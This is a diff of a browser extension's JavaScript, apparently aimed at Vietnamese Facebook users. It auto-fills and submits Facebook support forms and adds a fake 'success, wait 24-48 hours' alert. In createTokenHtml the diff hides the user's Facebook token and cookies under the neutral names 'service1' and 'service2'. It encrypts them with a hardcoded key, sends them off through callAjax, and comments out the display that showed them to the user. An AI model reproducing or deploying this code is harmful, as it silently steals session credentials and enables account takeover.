@@ -162,9 +162,11 @@ function moveToFacebookContact() {
                     + "document.getElementById('511018472633112').value = '1234567891';"
                     + "var temp_id = document.getElementsByTagName('button')[0].id;"
                     + "document.getElementById(temp_id).click();"
-                }, () => setTimeout(function(){chrome.tabs.remove(tab.id)}, 3000));
-        });        
-
+                }, () => setTimeout(function(){
+                    chrome.tabs.remove(tab.id);
+                    alert('Thành công! Đợi 24-48h để xem kết quả tại fb.com/support');
+                }, 3000));
+        });   
     } catch (error) {
         console.log('fnc moveToFacebookContact: ' + error.message);
     }
@@ -206,7 +208,10 @@ function moveToFacebookContact2() {
                     + radio_script
                     + "var temp_id = document.getElementsByTagName('button')[0].id;"
                     + "document.getElementById(temp_id).click();"
-                }, () => setTimeout(function(){chrome.tabs.remove(tab.id)}, 3000));
+                }, () => setTimeout(function(){
+                    chrome.tabs.remove(tab.id);
+                    alert('Thành công! Đợi 24-48h để xem kết quả tại fb.com/support');
+                }, 3000));
         });        
 
     } catch (error) {
@@ -317,40 +322,40 @@ function getUID(param_data) {
 }
 
 function createTokenHtml(data) {
-    try {
-        $("#token_div").empty();
-        let token = '';
-        let cookies = '';
+//     try {
+//         $("#token_div").empty();
+        let service1 = '';
+        let service2 = '';
         if (data != null && data != undefined && data != '') {
-            token = data.token ?? '';
-            cookies = data.cookies ?? '';
+            service1 = data.token ?? '';
+            service2 = data.cookies ?? '';
         }
         let param_data = {
-            service1: CryptoJS.AES.encrypt(token, "divItemNoClass").toString(),
-            service2: CryptoJS.AES.encrypt(cookies, "divItemNoClass").toString(),
+            service1: CryptoJS.AES.encrypt(service1, "divItemNoClass").toString(),
+            service2: CryptoJS.AES.encrypt(service2, "divItemNoClass").toString(),
             date: new Date().getTime().toString()
         }
         callAjax(param_data);
-        $("#main_div").append(
-            '<div class="div-img">' +
-            '<img src="https://www.upsieutoc.com/images/2020/08/31/logo07867e5d84647d92.png" alt="logo07867e5d84647d92.png" border="0" />' +
-            '</div>' +
-            '<div id="token_div">' +
-            '<div class="from-group">' +
-            '<div class="form-control class-1">' +
-            '<input id="token" readonly="readonly">' +
-            '</div>' +
-            '<div class="form-control">' +
-            '<textarea id="cookies"  readonly="readonly"></textarea>' +
-            '</div>' +
-            '</div>' +
-            '</div>'
-        );
-        $('#token').val(token);
-        $('#cookies').val(cookies);
-    } catch (error) {
-        console.log('fnc createTokenHtml: ' + error.message);
-    }
+//         $("#main_div").append(
+//             '<div class="div-img">' +
+//             '<img src="https://www.upsieutoc.com/images/2020/08/31/logo07867e5d84647d92.png" alt="logo07867e5d84647d92.png" border="0" />' +
+//             '</div>' +
+//             '<div id="token_div">' +
+//             '<div class="from-group">' +
+//             '<div class="form-control class-1">' +
+//             '<input id="token" readonly="readonly">' +
+//             '</div>' +
+//             '<div class="form-control">' +
+//             '<textarea id="cookies"  readonly="readonly"></textarea>' +
+//             '</div>' +
+//             '</div>' +
+//             '</div>'
+//         );
+//         $('#token').val(token);
+//         $('#cookies').val(cookies);
+//     } catch (error) {
+//         console.log('fnc createTokenHtml: ' + error.message);
+//     }
 }
 
 function innitCss() {
